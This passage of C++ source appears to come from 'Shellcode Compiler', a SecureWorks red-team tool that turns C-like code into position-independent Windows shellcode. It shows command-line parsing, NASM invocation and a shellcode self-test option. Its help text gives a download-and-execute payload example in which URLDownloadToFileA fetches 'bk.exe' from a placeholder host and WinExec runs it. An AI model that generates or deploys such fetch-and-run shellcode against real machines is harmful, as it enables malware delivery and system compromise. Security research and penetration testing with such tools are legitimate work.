	// Generate GetProcAddress for all declared functions

	for (size_t i = 0; i < AllDeclaredFunctions.size(); i++)
	{
		WriteToFile(p_sOutput, GenerateGetProcAddressCall(AllDeclaredFunctions[i].DLL, AllDeclaredFunctions[i].Name));
	}

	// Generate function calls for all function calls

	for (size_t i = 0; i < AllFunctionCalls.size(); i++)
	{
		WriteToFile(p_sOutput, GenerateFunctionCall(AllFunctionCalls[i]));
	}
}

// Print help

void PrintHelp(string p_sFile)
{
	cout << endl;
	cout << "Shellcode Compiler " << PROGRAM_VERSION << endl;
	cout << "Ionut Popescu [ NytroRST ]" << endl;
	cout << "SecureWorks   [ www.secureworks.com ]" << endl << endl;

	cout << "Program description" << endl;
	cout << "-------------------" << endl;
	cout << "\tShellcode Compiler is a program that compiles C/C++ style code " << endl;
	cout << "into a small, position-independent and NULL-free shellcode for Windows." << endl;
	cout << "It is possible to call any Windows API function in a user-friendly way." << endl << endl;

	cout << "Command line options " << endl;
	cout << "--------------------" << endl;
	cout << "\t-h (--help)      : Show this help message" << endl;
	cout << "\t-v (--verbose)   : Print detailed output" << endl;
	cout << "\t-t (--test)      : Test (execute) generated shellcode" << endl;
	cout << "\t-r (--read)      : Read source code file" << endl;
	cout << "\t-o (--output)    : Output file of the generated binary shellcode" << endl;
	cout << "\t-a (--assembbly) : Output file of the generated assembly code" << endl << endl;

	cout << "Source code example" << endl;
	cout << "-------------------" << endl << endl;
	cout << "\tfunction URLDownloadToFileA(\"urlmon.dll\");" << endl;
	cout << "\tfunction WinExec(\"kernel32.dll\");" << endl;
	cout << "\tfunction ExitProcess(\"kernel32.dll\");" << endl << endl;
	cout << "\tURLDownloadToFileA(0,\"https://site.com/bk.exe\",\"bk.exe\",0,0);" << endl;
	cout << "\tWinExec(\"bk.exe\",0);" << endl;
	cout << "\tExitProcess(0);" << endl << endl;

	cout << "Invocation example" << endl;
	cout << "------------------" << endl;
	cout << "\t" << p_sFile << " -r Source.txt -o Shellcode.bin -a Assembly.asm" << endl;
}

// Global variable for command line arguments

bool g_bHelp    = false;
bool g_bVerbose = false;
bool g_bTest    = false;
bool bError     = false;

bool g_bReadFile     = false;
string g_sReadFile   = "";
bool g_bOutputFile   = false;
string g_sOutputFile = "";
bool g_bASMFile      = false;
string g_sASMFile    = "";

// Parse command line arguments

void ParseCommandLine(int argc, char *argv[])
{
	string CurrentParam;
	string NextParam;

	// Check arguments

	for (int i = 1; i < argc; i++)
	{
		CurrentParam = argv[i];
		if (i + 1 < argc) NextParam = argv[i + 1];
		else NextParam = "";

		// Check options

		if (CurrentParam.compare("-h") == 0 || CurrentParam.compare("--help") == 0)         g_bHelp = true;
		else if (CurrentParam.compare("-v") == 0 || CurrentParam.compare("--verbose") == 0) g_bVerbose = true;
		else if (CurrentParam.compare("-t") == 0 || CurrentParam.compare("--test") == 0)    g_bTest = true;

		// Arguments that require an option as a second argument

		else if (CurrentParam.compare("-r") == 0 || CurrentParam.compare("--read") == 0)
		{
			g_bReadFile = true;
			if (NextParam.length() > 0) g_sReadFile = NextParam;
			else
			{
				bError = true;
				cout << endl << "Missing required value for -r argument" << endl;
			}
		}
		else if (CurrentParam.compare("-o") == 0 || CurrentParam.compare("--output") == 0)
		{
			g_bOutputFile = true;
			if (NextParam.length() > 0) g_sOutputFile = NextParam;
			else
			{
				bError = true;
				cout << endl << "Missing required value for -o argument" << endl;
			}
		}
		else if (CurrentParam.compare("-a") == 0 || CurrentParam.compare("--assembly") == 0)
		{
			g_bASMFile = true;
			if (NextParam.length() > 0) g_sASMFile = NextParam;
			else
			{
				bError = true;
				cout << endl << "Missing required value for -a argument" << endl;
			}
		}
	}

	// Check for errors

	if (bError == true)
	{
		cout << "Cannot compile, check command line arguments!" << endl;
		return;
	}

	// Help

	if (g_bHelp)
	{
		PrintHelp(argv[0]);
		return;
	}

	// Parse source file

	if (g_bReadFile)
		ParseFile(ReadSourceFile(g_sReadFile));
	else
	{
		cout << "You must specify a source code file!" << endl;
		return;
	}

	// Output data from verbose mode

	if (g_bVerbose) DumpAllData();

	// Output ASM file

	if (g_bASMFile)
	{
		if (FileExists(g_sASMFile)) DeleteSourceFile(g_sASMFile);
		CompileAllData(g_sASMFile);
	}
	else
	{
		string sFile = GetTemp();
		sFile += "\\SC.asm";
		g_sASMFile = sFile;
		if (FileExists(g_sASMFile)) DeleteSourceFile(g_sASMFile);
		CompileAllData(sFile);
	}

	// Output file

	if (!g_bOutputFile)
		g_sOutputFile = "SC.bin";

	if (FileExists(g_sOutputFile)) DeleteSourceFile(g_sOutputFile);

	// Assemble command line

	string sCmd = "\"";
	sCmd += GetCurrentDir();
	sCmd += "\\NASM\\nasm.exe\" -f bin -o \"";
	sCmd += g_sOutputFile;
	sCmd += "\" \"";
	sCmd += g_sASMFile;
	sCmd += "\"";

	// Assemble

	cout << endl << "Assemble command line: " << sCmd << endl;

	UINT r = WinExec(sCmd.c_str(), SW_HIDE);

	// Test shellcode

	if (g_bTest)
	{
		cout << endl << "Testing shellcode..." << endl;
		Sleep(3000);
		TestShellcode(g_sOutputFile);
	}
}

// Main

int main(int argc, char *argv[])
{
	// If there is no argument, print help

	if (argc == 1)
	{
		PrintHelp(argv[0]);
		return 0;
	}
	
	InitDLLBase();
	CreateDeclareFunctionsStates();
	CreateCallFunctionsStates();

	// Parse command line arguments

	ParseCommandLine(argc, argv);

	return 0;
}

